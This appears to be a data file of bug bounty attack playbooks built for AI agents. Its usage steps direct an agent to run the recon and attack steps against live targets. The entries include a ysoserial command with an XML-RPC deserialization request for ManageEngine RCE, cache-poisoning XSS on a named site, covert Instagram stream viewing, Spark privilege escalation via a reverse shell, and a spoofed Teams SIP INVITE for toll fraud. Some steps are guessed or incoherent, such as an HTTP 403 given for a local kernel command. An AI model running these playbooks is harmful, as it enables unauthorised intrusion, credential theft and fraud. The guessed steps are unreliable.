description: Agent-ready bug bounty playbooks extracted from writeups.json. Same schema as agent_playbooks_github.json — safe to merge.

usage.step_1: Load tactic_index.json and look up your target's technology under by_technology to get relevant playbook IDs.
usage.step_2: Filter by by_access_level matching your current access to the target.
usage.step_3: Prioritize IDs in high_confidence and quick_wins lists for best hit rate.
usage.step_4: Load matching playbooks from this file by their 'id' field.
usage.step_5: Check trigger_conditions.prerequisites and applicability_signals against the live target.
usage.step_6: If conditions match, run attack_playbook.recon_steps first, then attack_steps.
usage.step_7: Confirm with success_indicators. If failed, use failure_indicators to pivot.

meta.title: CVE-2022-35405 Manage engines RCE (Password Manager Pro, PAM360 and Access Manager Plus)

target_profile.technology: ManageEngine (Password Manager Pro, PAM360, Access Manager Plus)

trigger_conditions.when_to_apply: When the target is confirmed to be running a vulnerable version of ManageEngine Password Manager Pro, PAM360, or Access Manager Plus, and the /xmlrpc endpoint is accessible.
prerequisites: Target is running a vulnerable version of Password Manager Pro, PAM360, or Access Manager Plus.
The /xmlrpc endpoint is accessible.
applicability_signals: Presence of the /xmlrpc endpoint.
Response indicates the product versions are within the vulnerable range.
skip_if: WAF blocks requests to /xmlrpc.
Target is running a patched version.

recon_steps: Step 1: Scan for the /xmlrpc endpoint on the target host.
Step 2: Attempt to identify the specific ManageEngine product and version by examining HTTP headers or response content, if available.
attack_steps: Step 1: Generate a Java serialized object payload using Ysoserial, ensuring the `org.apache.commons.beanutils` library version matches the server's.
Step 2: Encode the generated payload in Base64 and remove newline characters.
Step 3: Construct an XMLRPC request with the Base64 encoded payload embedded within a `<serializable>` tag.
Step 4: Send the crafted POST request to the `/xmlrpc` endpoint of the target.
Step 5: Analyze the response for signs of successful execution.
payloads_or_patterns:
java -jar ysoserial-version.jar CommonsBeanutils1 'command' | base64 | tr -d " \n "
POST /xmlrpc HTTP/1.1
Host: <TARGET_URL>
Content-Type: application/xml
Content-Length: 4093

<?xml version="1.0"?>
<methodCall>
  <methodName>ProjectDiscovery</methodName>
  <params>
    <param>
      <value>
        <struct>
          <member>
            <name>test</name>
            <value>
              <serializable xmlns="http://ws.apache.org/xmlrpc/namespaces/extensions">
                [base64-payload]
              </serializable>
            </value>
          </member>
        </struct>
      </value>
    </param>
  </params>
</methodCall>
tools_recommended: Ysoserial: To generate Java serialized object payloads.
curl: To send the crafted HTTP requests.
Burp Suite: To intercept and modify requests, and analyze responses.
Nuclei: For automated scanning using the provided template.
success_indicators: Response contains 'InvocationTargetException: java.lang.reflect.InvocationTargetException'.
Observable system command execution on the target server (e.g., reverse shell connection, file creation).
failure_indicators: Response other than InvocationTargetException (e.g., serialization errors, parsing errors).
No signs of command execution.
4xx or 5xx errors not related to the expected exploit response. Pivot: Check if the ysoserial library version matches the server's, or try a different gadget chain.

playbooks.impact: Remote code execution with SYSTEM/NT AUTHORITY permissions on the affected server, allowing for data compromise, internal network pivoting, or server shutdown.
playbooks.key_lesson: Always test XML-RPC endpoints for Java deserialization vulnerabilities, especially when the underlying library versions can be determined or bypassed.

meta.title: CVE-2022-34715: More Microsoft Windows NFS v4 Remote Code Execution

tech_stack_fingerprints: NFS service running on Windows Server 2022

trigger_conditions.when_to_apply: When a Windows Server 2022 is configured to use the NFSv4 protocol and is exposed to the network.
prerequisites: NFSv4 service must be enabled and running on the target.
Target must be Windows Server 2022.
applicability_signals: Target system is identified as Windows Server 2022.
Network scanning reveals open ports associated with NFS (typically 2049 TCP/UDP).
skip_if: NFS service is not running or not accessible.
Target is not Windows Server 2022.

recon_steps: Step 1: Identify target systems that are running Windows Server 2022.
Step 2: Perform network scans to detect open NFS ports (typically 2049 TCP/UDP).
Step 3: Confirm the NFS version in use, specifically looking for NFSv4 support.
attack_steps: Step 1: Craft a malicious RPC call targeting the NFSv4 protocol.
Step 2: Specifically, construct an RPC call that manipulates the ACE_Count field within the ACL attribute data of an NFSv4 request.
Step 3: Send the crafted RPC call to the target NFSv4 server.
Step 4: Monitor for signs of successful code execution or system crash.
payloads_or_patterns: Exploit requires precise crafting of ONC RPC messages with malformed ACL data, specifically an oversized ACE_Count field. Payload details are not explicitly provided in the writeup but would involve constructing a Series of RPC messages that trigger the buffer overflow in the ACE_Count processing. A template is not feasible without deeper reverse engineering of the specific exploit.
tools_recommended: Custom RPC client for crafting and sending malformed NFSv4 RPC requests.
Network traffic analysis tools (e.g., Wireshark) to inspect RPC packets.
Vulnerability scanner with NFSv4 support.
success_indicators: Arbitrary code execution in the context of SYSTEM on the target Windows Server 2022.
Unexpected system crash or instability on the target server.
failure_indicators: RPC calls are rejected with an error code indicating malformed request or protocol violation.
No observable change in system behavior or response.
Target system remains stable and operational without any indication of compromise.

playbooks.impact: An unauthenticated attacker can execute arbitrary code with SYSTEM privileges on a vulnerable Windows Server 2022, leading to complete system compromise.
playbooks.key_lesson: Always investigate vulnerabilities in network file sharing protocols like NFS, especially when dealing with newer versions and operating systems, as they often involve complex RPC mechanisms vulnerable to malformed requests.

meta.title: How to Decrypt Manage Engine PMP Passwords for Fun and Domain Admin - a Red Teaming Tale

tech_stack_fingerprints: Presence of ManageEngine Password Manager Pro (PMP) instance

trigger_conditions.when_to_apply: When an internet-exposed instance of ManageEngine Password Manager Pro (PMP) is detected.
applicability_signals: Instance of ManageEngine Password Manager Pro (PMP) is accessible over the internet
The version of PMP is vulnerable to CVE-2022-35405
skip_if: PMP is not exposed to the internet
PMP version is patched against CVE-2022-35405

recon_steps: Step 1: Identify internet-exposed ManageEngine Password Manager Pro (PMP) instances using Shodan or direct scanning.
Step 2: Determine the version of the PMP instance to check for vulnerability to CVE-2022-35405.
attack_steps: Step 1: Craft a Java serialized object using ysoserial targeting a vulnerable gadget chain.
Step 2: Embed the serialized object within an XML-RPC request to the PMP instance.
Step 3: Send the crafted XML-RPC request to the /xmlrpc endpoint of the PMP instance.
Step 4: Monitor for command execution via a callback (e.g., nslookup to a controlled OAST server) to confirm RCE.
tools_recommended: ysoserial: for generating Java serialized payloads.
curl: for sending the crafted XML-RPC requests.
Burp Suite Collaborator or similar OAST tools: for receiving command execution callbacks.
success_indicators: Successful command execution as evidenced by a callback to the OAST server (e.g., DNS lookup from the target server).
Successful decryption of PMP stored passwords after gaining RCE.
failure_indicators: No callback received from the OAST server, indicating the payload was not executed or deserialization failed. Pivot: Try different gadget chains in ysoserial.
The target server returns an error response without indicating command execution. Pivot: Verify PMP version and network connectivity.

playbooks.impact: Full control over the ManageEngine Password Manager Pro instance, including the ability to decrypt all stored credentials. This can lead to further compromise of other systems by obtaining domain administrator credentials or other sensitive secrets.
playbooks.key_lesson: When encountering internet-exposed ManageEngine PMP instances, always check for CVE-2022-35405 and leverage ysoserial for unauthenticated RCE via insecure deserialization in the XML-RPC handler.

meta.title: A Bug That Was 23 Years Old Or Not

trigger_conditions.when_to_apply: When a target uses curl and receives HTTP cookies, and the server implementation has not updated its parsing policies to be less liberal.
prerequisites: The target must be using curl or a library with a similar cookie parsing implementation.
The attacker must be able to control the content of HTTP cookies sent by the server.
applicability_signals: The target is observed to be making HTTP requests using curl.
The target's cookie handling implementation is based on older RFCs or has not been updated to strictly adhere to modern RFCs.
skip_if: The target's cookie parsing is extremely strict and rejects malformed cookies.
The target's server-side infrastructure has robust defenses against malformed HTTP requests or malformed cookies.

recon_steps: Step 1: Identify if the target is using curl by inspecting User-Agent strings in server logs or by observing network traffic.
Step 2: Research the specific version of curl or associated libraries the target is using to understand its cookie parsing capabilities and known vulnerabilities.
attack_steps: Step 1: Craft an HTTP response from a server controlled by the attacker that includes a malformed or unusually large cookie.
Step 2: Send this malformed cookie to the target system via an HTTP request that is intended to be processed by curl.
Step 3: Observe the target system for signs of denial of service, such as crashes, unresponsiveness, or excessive resource consumption.
payloads_or_patterns: Example of a potentially problematic cookie: Set-Cookie: name=<VERY_LONG_STRING_OR_MALFORMED_DATA>; Domain=example.com; Path=/
tools_recommended: Burp Suite: To craft and send custom HTTP requests with malformed cookies.
Custom script (e.g., Python with `requests`): To automate the sending of malformed cookies and monitor target response.
success_indicators: The target system becomes unresponsive or crashes after receiving the malformed cookie.
Significant increase in CPU or memory usage on the target system.
Error messages related to parsing or handling HTTP headers or cookies.
failure_indicators: The target system correctly parses the malformed cookie without issue, or rejects it gracefully.
No observable impact on the target system's availability or performance.

playbooks.impact: Denial of service against the target system by crashing or consuming excessive resources due to improper cookie parsing.
playbooks.key_lesson: When dealing with network services, always consider the possibility of older or less strict parsing implementations that can be exploited by malformed inputs, especially for widely adopted protocols like HTTP cookies.

meta.title: Simple IBM i (AS/400) Hacking

affected_components: TN5250 terminal sessions with custom initial programs
tech_stack_fingerprints: Presence of IBM i specific commands like WRKUSRPRF, WRKOBJ

trigger_conditions.when_to_apply: When a low-privilege user is restricted to a custom initial program on an IBM i system via TN5250, and the Attention Interrupt key functionality is not explicitly disabled.
prerequisites: Access to an IBM i system via TN5250
A low-privilege user account with an initial program configured that restricts direct command execution
The user profile does not have the ATTN key behavior overridden to disable command line access.
applicability_signals: User logs into a menu-driven interface instead of a direct command prompt
TN5250 terminal emulator is in use
The system is identified as IBM i / AS/400 / iSeries
skip_if: User is directly presented with a CL command prompt upon login
The Attention Interrupt key (ATTN) is disabled or remapped to a non-functional key by the User Profile configuration.

recon_steps: Step 1: Log in to the IBM i system using the provided low-privilege user credentials via TN5250.
Step 2: Observe the initial program displayed. Confirm it is a menu-driven interface and not a direct CL command prompt.
Step 3: Attempt to press the Attention Interrupt (ATTN) key (often F1 or a specific key combination depending on the emulator) to see if it brings up an 'Operational Assistant' or similar menu.
attack_steps: Step 1: Upon successfully triggering the ATTN key and accessing the 'Operational Assistant' menu, select the option to execute CL commands (often by pressing F9 for the command line).
Step 2: Once at the CL command prompt, execute the command 'WRKUSRPRF' to list user profiles.
Step 3: Review the output of 'WRKUSRPRF' for any user profiles with the special authority '*ALLOBJ'.

Step 4: If a profile with '*ALLOBJ' authority is found, proceed to exploit this by swapping to that profile (exact command depends on system configuration and available tools, but conceptually involves using a profile switching mechanism). This often requires specific system commands or exploit tools.
payloads_or_patterns: ATTN key event (specific key combination varies by TN5250 emulator)
F9 key event (for command line access from Operational Assistant menu)
tools_recommended: TN5250 emulator (e.g., Mocha TN5250, IBM Personal Communications)
Burp Suite (for intercepting and analyzing TN5250 traffic if applicable, though less common for direct terminal interaction)
Custom scripts for automated user profile enumeration and privilege escalation (if specific commands are identified)
success_indicators: Successful access to the CL command prompt after pressing the ATTN key.
Discovery of a user profile with '*ALLOBJ' special authority.
Successful execution of commands with the privileges of the '*ALLOBJ' user profile (e.g., executing commands normally restricted to administrators).
failure_indicators: ATTN key does not produce any menu or behavior change → The ATTN key functionality is likely disabled or remapped. Pivot to other reconnaissance methods.
No user profile with '*ALLOBJ' special authority is found → Privilege escalation via profile swapping is not directly possible. Explore other misconfigurations mentioned in the writeup.
Inability to execute commands even after reaching the CL prompt → Permissions or other restrictions are in place. Further investigation into specific user profile authorities is needed.

playbooks.impact: Attacker can execute arbitrary commands on the IBM i system with the privileges of the user profile possessing '*ALLOBJ' special authority, leading to complete system compromise.
playbooks.key_lesson: Always attempt to trigger special key events like ATTN (Attention Interrupt) in menu-driven terminal interfaces to bypass initial program restrictions and access underlying command execution functionalities.

meta.title: Your Amiibo’s Haunted

tech_stack_fingerprints: NFC file format (as described in writeup)

trigger_conditions.when_to_apply: When the Flipper Zero firmware version is 0.65.2 or older and an NFC file is loaded onto the device.
prerequisites: Attacker can provide a crafted NFC file to the Flipper Zero device.
applicability_signals: Target device is a Flipper Zero.
NFC functionality is enabled and used on the device.
skip_if: Flipper Zero firmware is updated to version 0.65.3 or later.
The Flipper Zero device is not capable of loading or processing NFC files.

recon_steps: Step 1: Identify the Flipper Zero device and confirm its firmware version.
Step 2: Inspect the structure of a valid NFC file used by the Flipper Zero (as provided in the writeup).
attack_steps: Step 1: Craft a malicious NFC file. The file should contain a 'page total' field that indicates more pages than can be safely stored in the 'dev_data.mf_ul_data.data' buffer.
Step 2: Load the crafted NFC file onto the vulnerable Flipper Zero device.
Step 3: Observe the device's behavior for crashes or unresponsiveness.
payloads_or_patterns: A crafted NFC file with an excessively large 'page total' field, leading to more than 510 pages of data (510 * 4 bytes = 2040 bytes), exceeding the MF_UL_MAX_DUMP_SIZE buffer (2040 bytes).
tools_recommended: Custom script to generate malicious NFC files.
Debugger (if available for Flipper Zero development) to analyze crash dumps.
success_indicators: Device crashes (e.g., BusFault, NULL pointer exception).
Device becomes unresponsive and requires re-flashing.
failure_indicators: Device processes the NFC file without any observable issues → The firmware may have been patched, or the crafted file does not correctly trigger the overflow.
Device displays an error message indicating invalid file format → The crafted file structure is incorrect; adjust based on Flipper NFC file parsing logic.

playbooks.impact: Denial of Service (DoS) by crashing the Flipper Zero device, potentially requiring a full re-flash to recover. In some cases, memory corruption may lead to arbitrary code execution, though this was not fully demonstrated.
playbooks.key_lesson: Always validate the size of incoming data against buffer limits when parsing file formats, especially for critical device firmware handling user-provided input.

meta.title: Caching the Un-cacheables - Abusing URL Parser Confusions (Web Cache Poisoning Technique)

trigger_conditions.when_to_apply: Applicable when a web application normalizes path traversal sequences differently on its caching layer than on its backend servers, and reflects user-controlled input without proper sanitization within JavaScript blocks.
prerequisites: Cache server and backend web application exhibit different normalization behaviors for path traversal sequences (e.g., /../).
User-controlled input is reflected unsanitized within a JavaScript block on specific pages.
Target pages are cacheable, but the direct exploitation path might be blocked by a WAF.
applicability_signals: Existence of path traversal characters (e.g., /../) in URLs that are processed differently by the cache and backend.
User input reflected within `<script>` tags in the HTML response without proper sanitization.
WAF blocking direct XSS payloads, suggesting a need for bypass techniques.
skip_if: Caching layer and backend application normalize path traversal sequences identically.
All user input reflected within script tags is properly sanitized.
WAF does not block common XSS payloads, indicating no need for cache poisoning bypass.

recon_steps: Step 1: Identify endpoints where URL parameters are reflected within JavaScript blocks (e.g., on Glassdoor, `/Job/` paths). Look for reflected parameters in `script` tags.
Step 2: Test for XSS by injecting closing script tags (e.g., `?xss=</script`) into reflected parameters. Note if payloads are blocked by a WAF.

Step 3: Investigate path normalization behavior by sending requests with path traversal sequences (e.g., `/Job/../../../Award/`) to see if the cache and backend interpret the path differently. Observe if `//../` is normalized to a different path by the cache than by the backend.
Step 4: Verify cacheability of target paths, specifically those that might be leveraged via path traversal (e.g., `/Award/` paths).
attack_steps: Step 1: Craft a request to an endpoint under a path that the backend interprets differently from the cache when using path traversal, for example, `https://www.glassdoor.com/Job/../Award/blah?xss=</script`. Ensure the `<script>` tag closing payload is in the URL parameter.

Step 2: For stored XSS on specific endpoints like `/mz-survey/interview/collectQuestions_input.htm`, use path traversal to reach a cacheable endpoint, e.g., `https://glassdoor.com/mz-survey/interview/collectQuestions_input.htm/../../../Award/blah`. The XSS payload should be in headers or cookies as per the writeup.

Step 3: The crafted request will be interpreted by the backend (e.g., `/Job/../Award/blah` might render content from `/Award/blah` with the injected payload), but cached by the caching server under the potentially different path (e.g., `/Award/blah`).

Step 4: After the poisoned cache entry is created, any user visiting the cached URL (e.g., `https://www.glassdoor.com/Award/blah?xss=</script` or the path for stored XSS) will receive the poisoned response containing the XSS payload.
tools_recommended: Burp Suite: To intercept and modify requests, send payloads, and observe responses.
Custom scripts: To automate the testing of path traversal sequences and cacheability checks.
success_indicators: Visiting the cached URL (e.g., `https://www.glassdoor.com/Award/blah?xss=</script`) triggers an XSS alert or displays a reflected payload.
For stored XSS, visiting the cacheable endpoint (e.g., `https://www.glassdoor.com/Award/blah`) executes JavaScript injected via headers/cookies.
Browser developer tools show the XSS payload being executed within the page content or within a script tag.
failure_indicators: Requests consistently result in a cache MISS for the target path, or the backend does not reflect the injected payload. → Re-evaluate path traversal sequences and backend interpretation.
WAF blocks all attempts even with path traversal. → Investigate alternative WAF bypass techniques or different injection points.
Backend sanitizes input reflected in script tags despite path traversal. → This technique is unlikely to work; pivot to other cache poisoning vectors.

playbooks.impact: Achieve stored Cross-Site Scripting (XSS) on cacheable pages by tricking the cache into storing a response generated by a different URL path. This allows for session hijacking, unauthorized actions, and further attacks against users who visit the poisoned cache entry.
playbooks.key_lesson: When testing web applications with caching, investigate discrepancies in path normalization between the cache layer and the backend web server, as this can lead to cache poisoning vulnerabilities, especially when combined with reflected input.

meta.title: Viewing Instagram live streams anonymously without notifying the host

trigger_conditions.when_to_apply: When an attacker can intercept and modify HTTP requests made by the Instagram mobile application to the live stream API, specifically targeting the heartbeat endpoint.
prerequisites: Attacker controls two Instagram accounts (Victim and Attacker).
Victim has initiated a "Practice" live stream and shared it with the Attacker, or the live stream is public.
Attacker can set up a proxy to intercept and modify HTTP requests.
applicability_signals: The existence of the /api/v1/live/[broadcast_id]/heartbeat_and_get_viewer_count/ endpoint is discoverable via proxying.
The mobile application makes continuous requests to this endpoint during a live stream.
skip_if: The target platform implements robust server-side checks to detect and block modified heartbeat requests.
The live stream viewer count is updated via a mechanism not reliant on the /heartbeat_and_get_viewer_count/ endpoint.

recon_steps: Step 1: Proxy Instagram mobile application traffic using Burp Suite to identify API endpoints related to live streams.
Step 2: Observe requests made during a live stream, paying attention to recurring requests that might indicate heartbeat or viewer count updates.
attack_steps: Step 1: Set up a "Match and Replace" rule in Burp Suite (Proxy -> Options).
Step 2: Configure the rule to match requests where the URL path contains "heartbeat_and_get_viewer_count/".
Step 3: Configure the rule to replace the matched path with a slightly modified string, e.g., "heartbeat_and_get_viewer_counts/" (adding an 's').
Step 4: Enable the rule and initiate the live stream on the Victim's account.
Step 5: As the Attacker, join the live stream by clicking on the link sent by the Victim or by navigating to the public live stream.
Step 6: Observe the Victim's perspective to confirm they are not notified of the Attacker's presence and the viewer count does not increment.
tools_recommended: Burp Suite: Use "Match and Replace" rules to modify outgoing requests.
Instagram Mobile App: For simulating user interaction.
Two Instagram Accounts: One for the Victim, one for the Attacker.
success_indicators: The Victim does not receive a notification that the Attacker has joined the live stream.
The viewer count on the Victim's live stream interface remains unchanged or does not reflect the Attacker's presence.
The Attacker can view the live stream content without being listed as a viewer or affecting the viewer count.
failure_indicators: The Victim is notified of the Attacker joining, or the viewer count increases: The modification rule is ineffective, or there are server-side checks preventing this.
The Attacker receives an error or is disconnected from the stream: The modified request is rejected by the server, indicating the endpoint is critical and its modification is detected.

playbooks.impact: An attacker can anonymously watch Instagram live streams without the host's knowledge or consent. This bypasses privacy expectations and could allow for unauthorized surveillance of private or sensitive live content, especially in 'practice' mode where the host might assume they are alone.
playbooks.key_lesson: Interfering with heartbeat or keep-alive mechanisms for real-time streaming can lead to privacy bypasses by preventing the server from accurately tracking and notifying participants.

meta.title: Google & Apache Found Vulnerable to GitHub Environment Injection

trigger_conditions.when_to_apply: When a GitHub Actions workflow processes untrusted input that is then reflected into environment variables within the workflow's execution context.
prerequisites: Attacker must be able to influence input processed by a GitHub Actions workflow.
The workflow must use the influenced input to construct sensitive environment variables.
applicability_signals: Workflow YAML files that dynamically set environment variables using input parameters.
Workflows that execute commands or scripts using these environment variables.
skip_if: Workflows that do not use external or user-supplied input to define environment variables.
Workflows that sanitize all user input before using it in environment variable definitions.

recon_steps: Identify GitHub Actions workflows within the target repository.
Analyze workflow YAML files for instances where user-controlled input is used to define environment variables (e.g., using `env:` or `run:` blocks that incorporate inputs).
attack_steps: Step 1: Identify an input parameter in a GitHub Actions workflow that is used to define an environment variable (e.g., `inputs.user_input`).
Step 2: Craft a malicious input value that exploits the intended use of the environment variable. For example, to inject a new environment variable, use a string like `MALICIOUS_VAR=sensitive_value`.
Step 3: Submit a pull request or trigger the workflow with the crafted malicious input.
Step 4: Observe the workflow logs for the newly defined environment variable and its value. If the value is printed or used in a subsequent step, it confirms successful injection.
tools_recommended: GitHub CLI: To interact with GitHub repositories and trigger workflows programmatically.
Code analysis tools: To identify vulnerable workflow patterns.
success_indicators: The injected environment variable (`MALICIOUS_VAR`) and its value (`sensitive_value`) appear in the GitHub Actions workflow logs.
The injected environment variable is used by subsequent steps in the workflow, potentially leading to data exfiltration or unauthorized actions.
failure_indicators: The malicious input is not reflected in the environment variables or is sanitized. Pivot: Look for other input vectors or different types of workflow vulnerabilities (e.g., command injection within scripts).

playbooks.impact: An attacker can inject arbitrary environment variables into a GitHub Actions workflow, potentially leading to privilege escalation, unauthorized access to secrets, or manipulation of build/deployment processes. This could allow for the compromise of the CI/CD pipeline and any systems it interacts with.
playbooks.key_lesson: Always sanitize and validate user-controlled input before using it to define environment variables in CI/CD workflows, as untrusted input can lead to environment injection and potential compromise of the pipeline.

meta.title: Azure Synapse: Local Privilege Escalation Vulnerability in Spark

target_profile.required_access_level: any_authenticated_user (with ability to run a Spark job)

trigger_conditions.when_to_apply: When an authenticated user can execute code within an Azure Synapse Apache Spark pool, and that user can escalate privileges using the 'filesharemount.sh' script.
prerequisites: Access to an Azure Synapse Analytics workspace
Ability to run code within a Spark pool
applicability_signals: The existence of the 'systemreservedpool-dataflow' Spark pool.
The user running as 'trusted-service-user' within the Spark pool.
The output of 'sudo -l' showing 'trusted-service-user ALL= NOPASSWD: /usr/lib/notebookutils/bin/filesharemount.sh'.
skip_if: The 'filesharemount.sh' script is not executable by 'trusted-service-user' as root.
The user within the Spark pool has root privileges by default.

recon_steps: Step 1: Identify if Azure Synapse Analytics is in use. Fingerprint by observing Azure-specific headers or API responses.
Step 2: Attempt to create or use an existing Apache Spark pool within Azure Synapse.
Step 3: Execute a Python reverse shell within the Spark pool to gain shell access on the underlying VM.
Step 4: Run `whoami` to confirm user is 'trusted-service-user'.
Step 5: Run `sudo -l` to identify commands that can be run as root without a password.
attack_steps: Step 1: Confirm that `/usr/lib/notebookutils/bin/filesharemount.sh` is listed as executable by `trusted-service-user` as root via `sudo -l`.
Step 2: Analyze the contents of the `/usr/lib/notebookutils/bin/filesharemount.sh` script. Identify how it handles mount points and ownership.

Step 3: Construct a payload to exploit the script. The writeup implies a race condition or unintended use of mount/chown. The core issue is likely related to path manipulation or overwriting critical files by controlling the mount point and ownership arguments.
Step 4: Execute the crafted payload via the `sudo` command: `sudo /usr/lib/notebookutils/bin/filesharemount.sh <crafted_arguments>`
Step 5: Verify privilege escalation by attempting to access root-level files or execute root commands.
tools_recommended: Python (for reverse shell)
ssh (if applicable to connect to the VM)
Burp Suite (for intercepting and modifying requests if interacting via API)
success_indicators: Ability to execute commands as root (e.g., `sudo cat /etc/shadow`).
Access to sensitive files that are normally restricted to root.
Successful execution of a root-level reverse shell.
failure_indicators: `sudo -l` does not list the script or requires a password.
The script fails to execute or indicates a permission error during execution.
No observable change in privileges after attempted exploitation.

playbooks.impact: Local Privilege Escalation to root on the underlying VM hosting the Spark pool, allowing for full compromise of the Spark environment and potentially access to sensitive data processed by Synapse.
playbooks.key_lesson: When a low-privileged user can execute a script as root without a password, carefully analyze the script's functionality for unintended consequences, especially concerning file system operations like mounting and ownership changes, which can lead to privilege escalation.

meta.title: Using Hackability to uncover a Chrome infoleak

trigger_conditions.when_to_apply: When testing web applications that are intended to be loaded within an iframe on a different origin, and the application itself is capable of hosting other iframes.
prerequisites: The target application must be frameable by an external domain.
The attacker must control a domain that can load the target application in an iframe.
applicability_signals: Target application successfully loads within an iframe from a different origin.
Target application itself contains an iframe pointing to a cross-origin resource.
skip_if: Target application explicitly disallows being framed (e.g., via X-Frame-Options or CSP frame-ancestors).

recon_steps: Step 1: Identify if a target web application can be loaded within an iframe by a different origin. Use browser developer tools to check for X-Frame-Options and CSP headers.
Step 2: If the application is frameable, identify if it contains any iframes pointing to cross-origin resources.
attack_steps: Step 1: Create an HTML page on an attacker-controlled domain that contains an iframe loading the target web application: `<iframe src='<TARGET_URL>'></iframe>`

Step 2: Within the attacker's HTML page, use JavaScript to access the `contentWindow` of the target iframe. Then, attempt to set the location of a subframe within the target application's iframe to 'about:blank': `targetIframe.contentWindow.subframe.location = 'about:blank';` (Note: `subframe` might need to be identified dynamically based on the target application's structure).

Step 3: After setting the subframe location, access the properties of the `about:blank` window within the subframe. Specifically, inspect the `document.baseURI` property: `attackerWindow.eval('targetIframe.contentWindow.subframe.document.baseURI')`
tools_recommended: Browser Developer Tools (for inspecting iframes and JavaScript console)
Custom HTML page for hosting the attacker's iframe
success_indicators: The `document.baseURI` property returns a URL that is cross-origin to the attacker's domain, revealing sensitive path or query string information from the target application's context (e.g., OAuth tokens in URL parameters).
failure_indicators: The `document.baseURI` property returns 'about:blank' or the attacker's own origin. This indicates the bypass was not successful. Consider other SOP bypass techniques.
Errors when accessing `contentWindow` or `document` properties, likely due to strict CSP or other browser security mechanisms.

playbooks.impact: Information disclosure of sensitive data such as OAuth tokens, session identifiers, or other URL parameters that are normally protected by the Same Origin Policy.
playbooks.key_lesson: When an iframe loads a cross-origin document, always inspect the `baseURI` property of the iframe's document for potential information leaks, especially after navigating the iframe to 'about:blank'.

meta.title: SETTLERS OF NETLINK: Exploiting a limited UAF in nf_tables (CVE-2022-32250)

trigger_conditions.when_to_apply: This exploit is applicable when the target system is running a vulnerable version of the Linux kernel with the nf_tables module loaded and attacker-controlled network access or local access to manipulate netfilter rules.
prerequisites: The target system must be running a Linux kernel version affected by CVE-2022-32250 (prior to 5.10.140, 5.15.56, 5.19.11).
The nf_tables module must be loaded.
Attacker must have the ability to create/manipulate netfilter rules, either locally or via a network interface that can be influenced by netfilter.
applicability_signals: Existence of the nf_tables module.
Ability to interact with netfilter rules (e.g., through `iptables` or `nft` commands).
skip_if: The target system is running a patched kernel version.
The nf_tables module is not loaded or cannot be manipulated by the attacker.

recon_steps: Step 1: Identify the Linux kernel version running on the target system. Check for version strings in `/proc/version` or by using `uname -a`.
Step 2: Verify if the `nf_tables` module is loaded using `lsmod | grep nftables`.

Step 3: Determine if the attacker has privileges to manipulate `nft` rulesets. If not, assess if network-facing interfaces can indirectly influence rule creation (less likely for this specific vulnerability).
attack_steps: Step 1: Craft a specific `nft` ruleset that triggers the use-after-free condition in `nf_tables` during garbage collection.
Step 2: Apply the crafted ruleset to the target system using the `nft` command-line utility.
Step 3: Trigger the vulnerability by performing actions that lead to the garbage collection of the affected `nft` object (e.g., adding and then deleting rules or objects in a specific sequence).
Step 4: Observe the system for signs of kernel panic or other memory corruption indicators. If successful, an attacker can leverage this to achieve arbitrary code execution within the kernel.
payloads_or_patterns: Refer to the technical details and proof-of-concept code provided in the writeup for the exact `nft` ruleset and sequence of operations required to trigger the UAF.
tools_recommended: nft (netfilter rules utility)
System monitoring tools (e.g., `dmesg`, `journalctl`) to observe kernel logs for panics or errors.
success_indicators: Kernel panic (system crash).
Observable memory corruption leading to unexpected system behavior.
Successful arbitrary code execution within the kernel context (if a full exploit chain is developed).
failure_indicators: No kernel panic or observable memory corruption after applying the rules. This could indicate a patched kernel, incorrect rule application, or insufficient trigger actions. Pivot to checking for other kernel vulnerabilities.
403 Forbidden if `nft` command execution is restricted.

playbooks.impact: Successful exploitation of CVE-2022-32250 can lead to a use-after-free vulnerability in the `nf_tables` component of the Linux kernel. This can be leveraged by a local attacker to achieve arbitrary code execution within the kernel context, ultimately leading to a full system compromise and privilege escalation to root.
playbooks.key_lesson: Always verify Linux kernel versions and check for known vulnerabilities in network filtering components like `nf_tables` when assessing system security, as these can lead to critical privilege escalation.

meta.title: Abusing Microsoft Teams Direct Routing

target_profile.technology: Microsoft Teams Direct Routing (specifically AudioCodes SBC)
affected_components: Session Border Controller (SBC) configuration for Direct Routing
tech_stack_fingerprints: Presence of an AudioCodes SBC integrated with Microsoft Teams Direct Routing

trigger_conditions.when_to_apply: When a Microsoft Teams Direct Routing setup uses an SBC (like AudioCodes) that relies on FQDN and Contact header for SIP message classification without further authentication.
prerequisites: The target organization uses Microsoft Teams Direct Routing.
The SBC is configured according to vendor recommendations, specifically looking for 'pstnhub.microsoft.com' in the Contact header and the SBC's FQDN as the destination host in the SIP Request-URI.
The attacker can send arbitrary SIP messages to the target's SBC.
applicability_signals: SBC documentation or configuration showing reliance on FQDN and specific Contact header content for classification.
Absence of client certificate authentication or other strong authentication mechanisms for incoming SIP messages.
skip_if: SBC requires additional authentication beyond FQDN and Contact header for SIP messages.
The SBC actively blocks or rejects unverified SIP origins.

recon_steps: Step 1: Identify the target organization's SIP signaling endpoints. This may involve network scanning or analysis of publicly available SIP registration information.
Step 2: If the target uses Microsoft Teams Direct Routing, attempt to identify the Session Border Controller (SBC) vendor and model, if possible (e.g., by analyzing SIP headers if access is gained).
Step 3: Review available public documentation for the identified SBC vendor's recommended Microsoft Teams Direct Routing configurations, specifically looking for classification criteria.
attack_steps: Step 1: Craft a malicious SIP INVITE message.
Step 2: Set the 'Request-URI' host part to the victim's SBC FQDN (e.g., <SBC_FQDN>).
Step 3: Set the 'Contact' header host part to 'pstnhub.microsoft.com'.
Step 4: Include headers that mimic legitimate Microsoft Teams traffic to ensure classification.
Step 5: Send the crafted SIP INVITE message to the victim's SBC.
Step 6: Observe if the SBC processes the call as if it originated from Microsoft, leading to an external call being placed using the victim's PSTN subscription.
payloads_or_patterns:
SIP INVITE message:

INVITE sip:your_teams_user@yourdomain.com;user=phone SIP/2.0
Via: SIP/2.0/UDP <ATTACKER_IP>:5060
From: <sip:attacker@attacker.com>;tag=some_tag
To: <sip:recipient@victim.com>
Call-ID: <unique_call_id>@<attacker.com>
CSeq: 1 INVITE
Contact: <sip:pstnhub.microsoft.com;user=phone>
Max-Forwards: 70
Allow: INVITE, ACK, CANCEL, BYE, REFER, NOTIFY, SUBSCRIBE, OPTIONS
User-Agent: Microsoft Teams SIP Proxy
Content-Type: application/sdp

v=0
o=- 12345 12345 IN IP4 <ATTACKER_IP>
s=session
t=0 0

m=audio 9 UDP/TLS/RTP/SAVPF 0 8 101
a=rtpmap:0 PCMU/8000
a=rtpmap:8 PCMA/8000
a=rtpmap:101 telephone-event/8000
a=fmtp:101 0-16

